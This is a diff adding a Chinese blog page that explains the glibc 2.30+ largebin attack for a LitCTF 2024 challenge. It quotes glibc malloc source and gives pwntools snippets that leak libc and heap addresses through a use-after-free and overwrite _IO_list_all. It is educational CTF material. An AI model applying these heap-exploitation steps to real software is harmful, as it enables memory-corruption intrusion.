@@ -1,0 +1,357 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
+  
+  <title>『Heap Exploitation』largebin_attack | C_LBY&#39;s BLOG</title>
+  <meta name="author" content="鎏柏鱼">
+  
+  <meta name="description" content="largebin attack分为2.30前和2.30后两种情况。这里记录2.30后的攻击方法，2.30前的可以看[hollk师傅](https://blog.csdn.net/qq_41202237/article/details/112825556)的讲解。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="『Heap Exploitation』largebin_attack"/>
+  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 『Heap Exploitation』largebin_attack</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<div class="alert alert-success description">
+										<i class="fa fa-info-circle"></i> largebin attack分为2.30前和2.30后两种情况。这里记录2.30后的攻击方法，2.30前的可以看[hollk师傅](https://blog.csdn.net/qq_41202237/article/details/112825556)的讲解。
+									</div> <!-- alert -->
+									
+
+										<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>首先每个Large Bin中存在63个bin链表，在binmap中的index是64-126。每个bin中存的是一定范围内大小的chunk，而不是像tcachebin那样的一个bin一个大小。举个栗子，index64的bin中存的是0x400到0x430的chunk。每个bin能存取的范围一般是0x30。</p>
+<p>Large Bin既不是FIFO也不是LIFO，它的排序是根据chunk大小来进行的，并且结构更加复杂。large chunk被释放的时候不仅会被写入fd和bk，还有fd_nextsize和bk_nextsize两个指针来维护bin的结构。fd和bk用来链接bin中相同大小的chunk，而nextsize则用来链接bin中不同大小的chunk。更具体地说，<code>fd</code>指向比自己晚释放的相同大小的chunk，<code>bk</code>则指向比自己晚释放的相同大小的chunk，<code>fd_nextsize</code>用来指向比自己大的chunk，<code>bk_nextsize</code>则指向比自己小的chunk。在相同大小的chunkbin中只有首堆块会有nextsize的指针。bin中首尾chunk的nextsize会指向另一端，首堆块的fd会指向对应index的bin头地址，尾堆块的bk会指向对应index的bin头地址。</p>
+<p>这里引用Sr0cky师傅的一张图，可以更直观地看清楚largebin的结构：</p>
+<p><img src="https://c-lby.top/images/largebin_attack/largebin%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="largebin链表示意图"></p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>我们只关注释放chunk时候的代码，因为主要检查在这个地方，主要利用的地方也在这里。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">       ...</span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = smallbin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = largebin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">            <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                size |= PREV_INUSE;</span><br><span class="line">                <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                  &#123;</span><br><span class="line">                    fwd = bck;</span><br><span class="line">                    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    assert (chunk_main_arena (fwd));</span><br><span class="line">                    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                      &#123;</span><br><span class="line">                        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">	  assert (chunk_main_arena (fwd));</span><br><span class="line">                      &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">	  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                      <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        mark_bin (av, victim_index);</span><br><span class="line">        victim-&gt;bk = bck;</span><br><span class="line">        victim-&gt;fd = fwd;</span><br><span class="line">        fwd-&gt;bk = victim;</span><br><span class="line">        bck-&gt;fd = victim;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+
+<p>如果chunk在smallbin范围，则插入到smallbin中，如果不是，则进行下一步，进行插入largebin的处理。此时<code>bck</code>是对应index的bin头。<code>victim</code>指的是当前正在被释放的chunk。</p>
+<p>第17行的if与第60行的else匹配，检查如果该bin为空，则直接将victim的nextsize都指向自身，fd和bk指向bin头。如果不为空则进入下一个检查。</p>
+<p>第42行检查victim的size是否小于当前bin中最小的那个chunk，则直接将victim插入到bin的头部。在这里有个很重要的语句（第31行），也是我们需要利用到的语句。我们来逐行解释一下这个语句块。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>为避免歧义，首先说明，在这些语句执行完之前我们不认为victim已经进入了bin。首先将<code>fwd</code>赋值为bin头，然后<code>bck</code>赋值为当前bin中最小那个chunk。紧接着将victim的<code>fd_nextsize</code>赋值为bin中的尾堆块，然后将<code>bk_nextsize</code>赋值为当前bin中最小的chunk。然后重点来了！当前bin中的尾堆块的<code>bk_nextsize</code>指向victim，当前最小chunk的<code>fd_nextsize</code>也指向victim。现在我们才视为victim完全进入了largebin当中。</p>
+<p>可以注意到在这个过程，有两个指针被赋值为victim的地址。如果我们在释放victim之前有机会修改当前bin中最小chunk的<code>bk_nextsize</code>为<code>target</code>，那也就意味着我们可以往<code>target+0x20的位置</code>写入victim的地址。这个结果就是我们所说的largebin attack的结果。</p>
+<p>2.30前后的区别在于第50行和第57行的两个检查，多了两个检查所以就不能使用传统的largebin attack方法了。</p>
+<h3 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h3><p>其实可以看how2heap的PoC学习，这里我直接结合<a href="https://c-lby.top/2024/06/04/2024-litctf-wp/#0x05-2-35">2024litctf的2.35</a>那题来讲。</p>
+<p>根据源码分析，我们如果想要执行到那条重要语句，我们需要先后释放掉一大一小两个largechunk。在每个largechunk下面要多一个chunk用来防止largechunk被释放后被向下合并，大小任意。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
+
+<p>接着我们释放<code>chunk2</code>。这时候它先进入到<code>unsortedbin</code>中，我们申请一个比<code>chunk2</code>还要大的chunk，因为<code>chunk2</code>不够被分配，所以它会被整理到largebin当中。这时候他就同时拥有了libc地址和heap地址。</p>
+<p>因为有UAF，所以可以直接从<code>chunk2</code>泄露出libc地址和heap。因为show函数使用的是printf语句，所以要注意\x00截断的问题：保护chunk如果是0x20，那么<code>chunk2</code>的地址最后一个字节刚好是\x00，那就没法泄露了；fd和bk是指向main_arena+0x490处的libc地址，同样有\x00字节，所以在泄露堆地址的时候要先随便填点什么00之外的东西在fd和bk位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">large = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 其实是main_arena+0x490</span></span><br><span class="line">libcbase = large - <span class="number">0x670</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  <span class="comment"># 也可以直接看vmmap动调出偏移</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
+
+<p>然后我们释放<code>chunk0</code>进入到<code>unsrotedbin</code>中，然后修改<code>chunk2</code>的<code>bk_nextsize</code>为<code>_IO_list_all-0x20</code>(因为后续会打house of apple2)。接着我们申请一个大于chunk2的chunk，把chunk0放进largebin中。根据源码分析，我们可以知道<code>_IO_list_all</code>就会被写入chunk0的地址。至此，largebin attack就算完成了。</p>
+<p>我们断点检查一下：</p>
+<p><img src="https://c-lby.top/images/largebin_attack/2.35%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.png" alt="2.35攻击结果"></p>
+<p>可以看到_IO_list_all已经被写入chunk0的地址了。后面就是house of apple2了，这里不展开赘述。</p>
+
+											<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
+        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
+    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
+</div>
+							</div>
+
+							
+									
+										<span data-path="/2024/06/04/largebin-attack/">
+											<em class="post-meta-item-text"> Page View <i
+													class="waline-pageview-count"></i></em>
+										</span>
+
+										
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/06/04/2024-litctf-wp/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+											
+													
+														<section id="comments" class="comments">
+															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+  var walineConfig = 
+    walineConfig.el='#waline';
+  Waline.init(walineConfig);
+</script> -->
+
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+  init({
+    enable: true,
+    el: '#waline',
+    serverURL: 'https://blog-s-comment-three.vercel.app',
+    dark: true,
+    pageview: true,
+    lang: 'zh-CN',
+    requiredMeta: ['nick', 'mail'],
+    locale:
+      { placeholder: 'Say something……' },
+    highlighter: true,
+    search: false,
+    emoji: [
+      '//unpkg.com/@waline/emojis@1.2.0/weibo',
+      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
+      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
+      'https://unpkg.com/@waline/emojis@1.2.0/qq',
+    ],
+    imageUploader: false,
+  });
+</script>
+														</section>
+														
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+					
+						<div id="side_meta">
+							<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-04 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Heap-Exploitation/">Heap Exploitation<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>10</span></a></li> <li><a href="/tags/PWN/">PWN<span>12</span></a></li> <li><a href="/tags/heap/">heap<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-article-text">前置知识</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-article-text">源码</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-article-text">攻击手法</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+
+
+						</div>
+
+						
+
+			</div><!-- row -->
+
+			<!--
+ -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+    &copy; 2024
+      鎏柏鱼's Blog
+        
+                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
+                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
